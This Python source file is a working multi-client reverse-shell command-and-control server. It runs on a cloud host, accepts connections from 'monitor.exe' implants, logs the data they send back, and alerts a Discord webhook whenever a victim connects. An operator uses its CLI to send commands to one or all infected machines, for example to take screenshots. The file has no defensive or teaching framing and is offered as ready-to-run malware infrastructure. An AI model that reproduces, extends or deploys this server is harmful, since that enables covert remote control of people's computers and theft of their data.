"""
This is the server for the reverse shell.

Module: server/server.py

Multi-client reverse shell server. Designed to run head-less on an AWS EC2 instance.
Keeps listening for incoming TCP connections from `monitor.exe` clients and lets an
operator interactively list/select/send commands *without* restarting the
process. The main operator interface is an interactive CLI implemented with the
standard-library `cmd` module.

Usage (on the EC2 box):
    $ python server/server.py --port 4444

CLI commands:
    list                         Show all active clients
    select <id>                  Choose a client for subsequent send commands
    send <raw command>           Send a single command to selected client
    broadcast <raw command>      Send to *all* clients
    kick <id>                    Disconnect a client
    quit                         Terminate the server

All commands entered after `send` / `broadcast` are forwarded verbatim. To
invoke a custom utility you would type e.g.:
    `send use photographer take-screenshot`
The server automatically wraps messages with the required `>>` `<<` markers.
"""

from __future__ import annotations

# 1st party imports
import os
import sys
import cmd
import socket
import argparse
import threading
from typing import Dict, Tuple, List

# 3rd party imports
import requests


# check if the DISCORD_WEBHOOK is set
DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")
if not DISCORD_WEBHOOK:
    raise ValueError("DISCORD_WEBHOOK is not set. Please check the config.py file.")

# Logging configuration
LOG_FILE = "received_data.log"
LOG_LOCK = threading.Lock()


def parse_args() -> argparse.Namespace:
    """
    Parse command-line arguments.

    Returns:
        argparse.Namespace: Parsed arguments.
    """

    # Create argument parser
    parser = argparse.ArgumentParser(description="Reverse-shell C2 server")

    # Add arguments
    parser.add_argument(
        "--host", default="0.0.0.0", help="Bind address (default: 0.0.0.0)"
    )
    parser.add_argument(
        "--port", type=int, default=8080, help="Listening port (default: 8080)"
    )
    parser.add_argument("--buffer", type=int, default=4096, help="Socket buffer size")

    # Parse arguments
    return parser.parse_args()


# Data structures
ClientID = int
ClientInfo = Tuple[socket.socket, Tuple[str, int]]  # (socket, (ip, port))


class ClientRegistry:
    """Thread-safe mapping of connected clients."""

    def __init__(self):
        """Initialize a new client registry."""

        # Thread-safe storage of connected clients
        self._clients: Dict[ClientID, ClientInfo] = {}

        # Thread lock for thread-safe operations
        self._lock = threading.Lock()

        # Next available client ID
        self._next_id: ClientID = 1

    def send_discord_notification(self, message: str):
        """Send a notification to Discord.
        
        Args:
            message (str): The message to send to Discord.
        """

        # Send notification to Discord
        if DISCORD_WEBHOOK:
            try:
                requests.post(DISCORD_WEBHOOK, json={"content": message})
            except Exception as e:
                print(f"Send error to Discord: {e}")
        else:
            print("No Discord webhook URL found. Please set the DISCORD_WEBHOOK environment variable.")

    def add(self, sock: socket.socket, addr: Tuple[str, int]) -> ClientID:
        """Add a new client to the registry.

        Args:
            sock (socket.socket): Client socket.
            addr (Tuple[str, int]): Client address.

        Returns:
            ClientID: New client ID.
        """

        # Add client to registry
        with self._lock:

            # Generate a new client ID
            cid = self._next_id
            self._next_id += 1

            # Add client to registry
            self._clients[cid] = (sock, addr)

        # Notify Discord
        self.send_discord_notification(f"🟢 Client #{cid} connected from {addr[0]}:{addr[1]}")

        # Return new client ID
        return cid

    def remove(self, cid: ClientID):
        """Remove a client from the registry.

        Args:
            cid (ClientID): Client ID.
        """

        # Remove client from registry
        with self._lock:
            info = self._clients.pop(cid, None)

        # Notify Discord (outside the lock)
        if info:
            _, addr = info
            self.send_discord_notification(f"🔴 Client #{cid} at {addr[0]}:{addr[1]} disconnected")

    def get(self, cid: ClientID) -> ClientInfo | None:
        """Get a client from the registry.

        Args:
            cid (ClientID): Client ID.

        Returns:
            ClientInfo | None: Client information or None if not found.
        """

        # Get client from registry
        with self._lock:
            return self._clients.get(cid)

    def items(self) -> List[Tuple[ClientID, ClientInfo]]:
        """Get all clients from the registry.

        Returns:
            List[Tuple[ClientID, ClientInfo]]: List of clients.
        """

        # Get all clients from registry
        with self._lock:
            return list(self._clients.items())

    def all_ids(self) -> List[ClientID]:
        """Get all client IDs from the registry.

        Returns:
            List[ClientID]: List of client IDs.
        """

        # Get all client IDs from registry
        with self._lock:
            return list(self._clients.keys())


# ---------------------------------------------------------------------------
# Networking threads
# ---------------------------------------------------------------------------


def accept_loop(server_sock: socket.socket, registry: ClientRegistry, buffer: int):
    """Accept incoming connections and add clients to the registry.

    Args:
        server_sock (socket.socket): Server socket.
        registry (ClientRegistry): Client registry.
        buffer (int): Socket buffer size.

    Returns:
        None
    """

    # Accept incoming connections and add clients to the registry
    while True:
        try:

            # Accept incoming connection
            client_sock, addr = server_sock.accept()

            # Set timeout for client socket
            client_sock.settimeout(300)

            # Add client to registry
            cid = registry.add(client_sock, addr)
            print(f"[+] Client #{cid} connected from {addr[0]}:{addr[1]}")

            # Start client read loop
            threading.Thread(
                target=client_read_loop,
                args=(cid, client_sock, registry, buffer),
                daemon=True,
            ).start()
        except Exception as e:
            print(f"[!] Accept error: {e}")


def client_read_loop(
    cid: ClientID, sock: socket.socket, registry: ClientRegistry, buffer: int
):
    """Read data from client and print it to the console.

    Args:
        cid (ClientID): Client ID.
        sock (socket.socket): Client socket.
        registry (ClientRegistry): Client registry.
        buffer (int): Socket buffer size.

    Returns:
        None
    """

    # Read data from client and print it to the console
    while True:

        try:
            # Read data from client
            data = sock.recv(buffer)
            if not data:
                raise ConnectionResetError()

            decoded = data.decode(errors="ignore")

            # Write to log file
            with LOG_LOCK:
                with open(LOG_FILE, "a", encoding="utf-8") as fp:

                    # if the data is equal to the buffer size don't add a gap
                    if len(decoded) == buffer:
                        fp.write(decoded)
                    else:
                        fp.write(f"Client #{cid}: {decoded}\n\n")

            # Print data to console
            sys.stdout.write(f"\n[#{cid} output]\n{decoded}\n> ")
            sys.stdout.flush()
        except Exception:

            # Client disconnected
            print(f"[-] Client #{cid} disconnected")
            registry.remove(cid)

            try:

                # Close client socket
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except Exception:
                pass
            return


# ---------------------------------------------------------------------------
# Operator CLI
# ---------------------------------------------------------------------------


class C2Shell(cmd.Cmd):
    """Interactive CLI for operator."""

    intro = "Reverse-shell C2 - type help or ? to list commands."
    prompt = "> "  # will be overwritten by _update_prompt

    def __init__(self, registry: ClientRegistry, buffer: int):
        """Initialize a new C2 shell.

        Args:
            registry (ClientRegistry): Client registry.
            buffer (int): Socket buffer size.
        """

        # Initialize C2 shell
        super().__init__()

        # Initialize C2 shell attributes
        self.registry = registry
        self.current: ClientID | None = None
        self.buffer = buffer

        # update prompt based on current selection
        self._update_prompt()

    def _update_prompt(self):
        """Update CLI prompt to show current selection."""
        sel = str(self.current) if self.current else "null"
        self.prompt = f"[{sel}]> "

    def postcmd(self, stop: bool, line: str):
        """Refresh prompt after every command."""
        self._update_prompt()
        return stop

    # ----- basic commands -----
    def do_list(self, arg: str):  # list
        """This command is used to show the list of clients
        that are currently connected to the server.

        Syntax: list
        """

        # Show active clients
        if not self.registry.items():
            print("No clients connected.")
            return

        # Show active clients
        for cid, (_, addr) in self.registry.items():
            cur = "*" if cid == self.current else " "
            print(f"[{cur}] #{cid} {addr[0]}:{addr[1]}")

    def do_select(self, arg: str):
        """
        This command is used to select a client by id for subsequent send commands.
        Syntax: select <id>
        """

        # Select client by id for subsequent send commands
        try:

            # Select client by id
            cid = int(arg.strip())
            if self.registry.get(cid):
                self.current = cid
                print(f"Selected client #{cid}")
            else:
                print("No such client id")
        except ValueError:
            print("Usage: select <id>")

    def do_send(self, arg: str):
        """
        This command is used to send a single command to the selected client.
        Syntax: send <command>
        """

        # Send a single command to the selected client
        if not self.current:
            print("Select a client first (select <id>)")
            return

        # send the command
        self._send_to(self.current, arg)

    def do_broadcast(self, arg: str):
        """
        This command is used to send a command to all clients.
        Syntax: broadcast <command>
        """
        for cid in self.registry.all_ids():
            self._send_to(cid, arg)

    def do_clear(self, arg: str):
        """
        Clear the server console screen.
        Syntax: clear
        """

        # Windows uses 'cls', Unix uses 'clear'
        os.system("cls" if os.name == "nt" else "clear")

    def do_kick(self, arg: str):
        """
        This command is used to disconnect a client.
        Syntax: kick <id>
        """

        try:

            # Disconnect a client
            cid = int(arg.strip())
            info = self.registry.get(cid)
            if not info:
                print("No such client id")
                return

            # Disconnect a client
            sock, _ = info
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
        except Exception as e:
            print(f"Kick error: {e}")

    def do_quit(self, arg: str):
        """
        This command is used to shut down the server and exit.
        Syntax: quit
        """
        print("Exiting…")
        raise SystemExit

    # ----- helpers -----
    def _send_to(self, cid: ClientID, raw_cmd: str):
        """
        This command is used to send a command to a client.
        Syntax: send <command>
        """

        # Get client info
        info = self.registry.get(cid)
        if not info:
            print(f"Client #{cid} not available")
            return

        # get the socket
        sock, _ = info
        try:

            # Send command to client
            payload = f">>{raw_cmd}<<".encode()
            sock.sendall(payload)
            print(f"[>] Sent to #{cid}: {raw_cmd}")
        except Exception as e:
            print(f"Send error to #{cid}: {e}")

    # Aliases
    do_exit = do_quit
    do_EOF = do_quit


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


def main():
    """
    Entry point for the server.
    """

    # Parse command line arguments
    args = parse_args()

    # Create server socket
    server_sock = socket.socket()
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Bind server socket
    server_sock.bind((args.host, args.port))

    # Listen for incoming connections
    server_sock.listen()
    print(f"[+] Listening on {args.host}:{args.port} …")

    # Create client registry
    registry = ClientRegistry()

    # Start accept loop
    threading.Thread(
        target=accept_loop,
        args=(server_sock, registry, args.buffer),
        daemon=True,
    ).start()

    try:

        # Start C2 shell
        C2Shell(registry, args.buffer).cmdloop()
    finally:

        # Close server socket
        print("Shutting down…")
        server_sock.close()

        # Close all client sockets
        for cid, (sock, _) in registry.items():
            try:
                sock.close()
            except Exception:
                pass


if __name__ == "__main__":
    # Run server
    main()
